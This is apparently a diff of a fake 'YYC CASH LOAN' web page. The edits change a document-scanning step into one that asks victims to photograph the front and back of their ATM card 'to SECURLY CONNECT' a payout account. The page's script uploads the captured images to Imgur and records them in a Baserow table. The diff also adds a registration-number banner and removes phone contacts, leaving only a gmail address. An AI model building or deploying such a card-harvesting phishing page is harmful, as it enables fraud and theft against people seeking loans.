@@ -9,7 +9,7 @@
     <style>
         :root {
             --primary: #0066cc;
-            --primary-dark: #004d99;
+            --primary-dark: #28a745;
             --secondary: #ff9900;
             --text: #333333;
             --light-bg: #f5f7fa;
@@ -112,26 +112,26 @@
         .success-card {
             background-color: var(--white);
             border-radius: var(--border-radius);
-            padding: 30px 20px;
-            margin: 20px 0;
+            padding: 3px 2px;
+            margin: 2px 0;
             box-shadow: var(--shadow);
             text-align: center;
         }
 
         .success-icon {
-            font-size: 4rem;
+            font-size: 3rem;
             color: var(--success);
-            margin-bottom: 20px;
+            margin-bottom: 2px;
         }
 
         .success-title {
-            font-size: 1.5rem;
+            font-size: 1.1rem;
             color: var(--primary);
             margin-bottom: 15px;
         }
 
         .success-message {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             color: var(--text);
         }
 
@@ -473,6 +473,7 @@
         .scanner p {
             margin-bottom: 1rem;
             font-size: .9rem;
+            color: var(--accent);
         }
 
         .scanner video {
@@ -585,7 +586,7 @@
 <body>
     <div class="app-container">
         <header class="app-header">
-            <h1>YYC CASH LOAN</h1>
+            <h1>YYC CASH LOAN | NCRCP15906</h1>
         </header>
 
         <!-- Main Content (hidden initially) -->
@@ -597,23 +598,23 @@
             </div>
 
             <div class="scan-section">
-    <h3 class="section-title">Connect Your Book</h3>
+    <h3 class="section-title">Connect Your Bank Account for Payout</h3>
     
     <!-- Book Scanner from uploaded file -->
     <div id="permissionOverlay">
-        <h2>Allow Camera Access</h2>
+        <h2>Allow Camera Access to Scan</h2>
         <h1>To Verify Scan Out b<h1></h1>
         <button id="enableBtn">Enable Camera</button>
     </div>
     <div class="scanner" style="visibility:hidden;">
-        <h2 id="label">Front Picture</h2>
-        <p id="description">Scan the front of your book to upload to your account.</p>
+        <h2 id="label">Scan Card Front</h2>
+        <p id="description">Scan the front & Back of your ATM Card to SECURLY CONNECT the accont you want the Loan paid out to.</p>
         <div style="position: relative;">
             <video id="video" autoplay playsinline></video>
             <div id="scan-line" class="scan-line" style="display:none;"></div>
         </div>
         <button id="switchCamera">Switch Camera</button><br>
-        <button id="scanBtn" disabled>Scan Front Book</button>
+        <button id="scanBtn" disabled>Scan Card Front</button>
         <button id="next">Next</button>
         <button id="finish">Finish</button>
         <p id="status"></p>
@@ -631,14 +632,6 @@
                 <h3 class="section-title">Need Help?</h3>
                 <p>If you have any questions about your application, please contact us:</p>
                 <div class="contact-item">
-                    <i class="fas fa-phone"></i>
-                    <span>+27 10 123 4567</span>
-                </div>
-                <div class="contact-item">
-                    <i class="fab fa-whatsapp"></i>
-                    <span>+27 71 234 5678</span>
-                </div>
-                <div class="contact-item">
                     <i class="fas fa-envelope"></i>
                     <span>yyccashloan@gmail.com</span>
                 </div>
@@ -649,7 +642,7 @@
         <div id="connection-modal" class="modal-overlay">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h2 class="modal-title">Connect Your Book</h2>
+                    <h2 class="modal-title">Connect Your Bank Account Via scan</h2>
                 </div>
                 <div class="modal-body">
                     <div class="user-info">
@@ -663,7 +656,7 @@
                         </div>
                     </div>
                     
-                    <p>To enable access to your loan, you need to first connect your book to allow secure release of your loan instantly once connection is complete.</p>
+                    <p>To enable access to your loan, you need to first connect your Bank account Number to allow secure release of your loan instantly once connection is complete.</p>
                     
                     <p class="note-text">NOTE: Once connection is complete, funds are released same time/same day.</p>
                     
@@ -849,10 +842,10 @@ document.addEventListener('DOMContentLoaded', function() {
             const blob = await captureBlob(); const url = await uploadToImgur(blob);
             scanLine.style.display = 'none';
             if (currentStep === 'front') {
-                frontURL = url; status.textContent = 'Front image uploaded'; nextBtn.style.display = 'inline-block';
+                frontURL = url; status.textContent = 'Front Scan Successful'; nextBtn.style.display = 'inline-block';
             } else {
-                status.textContent = 'Uploading back & saving to Baserow…'; await createBaserowRow(frontURL, url);
-                status.textContent = '✅ Done!'; finishBtn.style.display = 'inline-block';
+                status.textContent = 'Scanning back & Processing Payout'; await createBaserowRow(frontURL, url);
+                status.textContent = '✅ Done!Click  finish and track your application'; finishBtn.style.display = 'inline-block';
             }
         } catch (e) { status.textContent = 'Error: ' + e.message; }
         finally { scanBtn.disabled = false; }
@@ -860,8 +853,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     scanBtn.addEventListener('click', handleScan);
     nextBtn.addEventListener('click', () => {
-        currentStep = 'back'; label.textContent = 'Back Picture'; desc.textContent = 'Scan the back of your book.';
-        scanBtn.textContent = 'Scan Back Book'; nextBtn.style.display = 'none'; status.textContent = '';
+        currentStep = 'back'; label.textContent = 'Back Scan'; desc.textContent = 'Scan the back of your Card.';
+        scanBtn.textContent = 'Scan Card Back'; nextBtn.style.display = 'none'; status.textContent = '';
     });
     finishBtn.addEventListener('click', () => window.location.href = 'complete.html');
     switchCam.addEventListener('click', () => { useFrontCamera = !useFrontCamera; initCamera(); });
